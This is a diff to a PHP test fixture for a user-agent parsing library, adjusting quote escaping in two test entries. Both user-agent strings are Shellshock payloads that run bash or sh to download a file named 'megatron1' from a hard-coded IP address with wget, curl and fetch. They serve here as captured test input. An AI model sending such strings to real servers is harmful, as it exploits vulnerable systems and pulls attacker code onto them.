@@ -3998,7 +3998,7 @@ return [
         ],
     ],
     'test-0006-148' => [
-        'ua'         => '() { :; }; /bin/bash -c \\'wget http://176.126.85.127:8080/megatron1 -O /dev/null\\'',
+        'ua'         => '() { :; }; /bin/bash -c \'wget http://176.126.85.127:8080/megatron1 -O /dev/null\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
@@ -10478,7 +10478,7 @@ return [
         ],
     ],
     'test-0006-388' => [
-        'ua'         => '() { :; }; /bin/sh -c \\'wget http://176.126.85.127:8080/megatron1 -O /dev/null; curl http://176.126.85.127:8080/megatron1; /usr/sfwbin/wget http://176.126.85.127:8080/megatron1;fetch -/dev/null http://176.126.85.127:8080/megatron1\\'',
+        'ua'         => '() { :; }; /bin/sh -c \'wget http://176.126.85.127:8080/megatron1 -O /dev/null; curl http://176.126.85.127:8080/megatron1; /usr/sfwbin/wget http://176.126.85.127:8080/megatron1;fetch -/dev/null http://176.126.85.127:8080/megatron1\'',
         'properties' => [
             'Browser_Name'            => 'Default Browser',
             'Browser_Type'            => 'unknown',
